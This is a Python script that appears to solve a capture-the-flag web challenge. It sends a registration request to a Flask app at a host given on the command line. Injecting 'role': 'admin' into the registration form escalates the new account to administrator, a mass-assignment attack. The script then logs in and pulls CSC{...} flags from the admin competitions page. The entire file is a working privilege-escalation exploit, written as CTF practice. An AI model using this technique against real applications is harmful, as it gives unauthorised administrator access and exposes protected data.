import requests
import secrets
import re
import sys

# Base URL of your Flask application
BASE_URL = f"http://{sys.argv[1]}:{sys.argv[2]}"

# Endpoint paths
REGISTER_PATH = "/register"
LOGIN_PATH = "/login"
COMPETITION_PATH = (
    "/manage-competitions"  # Assuming this is the endpoint for competitions
)


# Generate a random hexadecimal string of  128 characters
def generate_random_hex(length=128):
    return secrets.token_hex(length)


# Register a new user with role=admin
def register_user(username, password):
    data = {"username": username, "password": password, "role": "admin"}
    response = requests.post(f"{BASE_URL}{REGISTER_PATH}", data=data)
    if response.status_code == 200:
        print("Registration successful.")
    else:
        print("Registration failed.")


# Login a user
def login_user(username, password):
    data = {"username": username, "password": password}
    response = requests.post(f"{BASE_URL}{LOGIN_PATH}", data=data)
    if response.status_code == 200:
        print("Login successful.")
        return response.cookies  # Assuming the login sets a session cookie
    else:
        print("Login failed.")
        return None


# Get competition data and print only the extracted regex CSC{.*?}
def get_competitions(cookies):
    response = requests.get(f"{BASE_URL}{COMPETITION_PATH}", cookies=cookies)
    if response.status_code == 200:
        print("Competitions retrieved successfully.")
        # Assuming the endpoint returns JSON
        competitions_data = response.text

        # Extract and print the matching parts of the competition data
        matches = re.findall(r"CSC\{.*?\}", competitions_data)
        for match in matches:
            print(match)
    else:
        print("Failed to retrieve competitions.")


# Example usage
if __name__ == "__main__":
    username = generate_random_hex()
    password = generate_random_hex()

    # Register the user
    register_user(username, password)

    # Login the user and get the session cookies
    cookies = login_user(username, password)

    if cookies:
        # Get the competitions
        get_competitions(cookies)
    else:
        print("Login failed, cannot retrieve competitions.")
